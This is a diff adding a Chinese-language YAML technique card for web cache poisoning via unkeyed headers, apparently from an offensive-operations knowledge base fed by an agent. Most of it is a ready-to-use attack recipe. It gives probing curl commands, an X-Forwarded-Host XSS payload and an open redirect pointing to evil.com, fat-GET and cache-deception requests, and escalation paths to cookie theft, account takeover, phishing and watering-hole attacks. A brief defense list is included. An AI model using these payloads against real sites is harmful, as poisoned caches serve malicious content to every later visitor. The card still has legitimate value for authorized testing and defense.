@@ -1,0 +1,93 @@
+# 技术卡片: Web缓存投毒 - Unkeyed Header注入
+# 分类: cache-poisoning / web
+# 版本: 1.0
+# 日期: 2026-07-23
+# 来源: poison-ops P1 / PortSwigger Research (James Kettle)
+
+id: "cache-poisoning-unkeyed-header"
+name: "Web缓存投毒 — Unkeyed Header注入"
+category: "cache-poisoning"
+subcategory: "web-cache"
+severity: "high"
+
+description: |
+  利用缓存层不将某些请求头纳入缓存键（unkeyed）的行为，
+  注入恶意值到这些头中。源站使用该头值构造响应，但缓存
+  按不含该头的缓存键存储。后续所有请求该路径的用户都会
+  收到被污染的响应。
+
+trigger_signals:
+  - "响应头包含 X-Cache: HIT / CF-Cache-Status: HIT / Age > 0"
+  - "X-Forwarded-Host 等头回显在响应中"
+  - "同一路径两次请求（一次带注入头，一次不带）返回相同污染内容"
+  - "CDN/反向代理/Varnish/Nginx 缓存层"
+
+detection:
+  probe:
+    - action: "识别缓存层 → 注入随机唯一值到 X-Forwarded-Host"
+      payload: "curl -sI https://target.com/page"
+    - action: "无注入头再次请求同一路径 → 检查是否回显随机值"
+      payload: "curl -s https://target.com/page | grep <random>"
+    - action: "逐一测试 unkeyed 候选头"
+      note: "X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL, X-Rewrite-URL, Origin, X-Host"
+
+payloads:
+  xss_via_xfh:
+    - technique: "X-Forwarded-Host → XSS"
+      payload: "X-Forwarded-Host: evil.com\"><script>alert(1)</script>"
+      note: "源站将 XFH 写入 <script src=//{XFH}/...> 导致 XSS"
+
+  open_redirect:
+    - technique: "X-Forwarded-Host → 开放重定向"
+      payload: "X-Forwarded-Host: evil.com"
+      note: "响应中 302 Location 使用注入的 Host"
+
+  fat_get:
+    - technique: "GET 请求体注入"
+      payload: "curl -X GET 'https://target.com/page' -d 'callback=alert(1)'"
+      note: "某些缓存将 GET body 纳入响应但不纳入缓存键"
+
+  cache_deception:
+    - technique: "路径后缀欺骗 → 缓存敏感内容"
+      payload: "curl 'https://target.com/account.php/nonexistent.css'"
+      note: "缓存按 .css 缓存，源站返回 account.php 内容"
+
+success_indicators:
+  - "独立请求（不带注入头）的响应中包含注入的恶意值"
+  - "另一浏览器/会话访问同一 URL 看到污染内容"
+  - "非同一请求回显（不是反射）"
+
+prerequisites:
+  - "目标存在缓存层（CDN/反向代理/应用缓存）"
+  - "源站使用了某个请求头构造响应内容"
+  - "该请求头未被纳入缓存键（不在 Vary 中）"
+  - "缓存 TTL > 0"
+
+upgrade_paths:
+  - "XSS → Cookie 窃取 → 账号接管"
+  - "开放重定向 → 钓鱼攻击"
+  - "批量污染 → 供应链/水坑攻击"
+
+defense:
+  - "缓存键应包含所有用于构造响应的请求头"
+  - "Vary 头准确声明所有影响响应的头"
+  - "禁用缓存对未认证响应的存储"
+  - "在 CDN 层剥离不必要的转发头"
+
+tools:
+  - "curl"
+  - "httpx"
+  - "nuclei (cache-poisoning templates)"
+  - "mitmproxy"
+
+confidence: "high"
+limitations:
+  - "需要确认缓存确实未将该头纳入 key"
+  - "CDN 节点差异可能导致部分节点不命中"
+  - "短 TTL 需要精确计时"
+
+sources:
+  - agent: "blackmule"
+    date: "2026-07-23"
+  - ref: "PortSwigger: Practical Web Cache Poisoning"
+  - ref: "CWE-444"
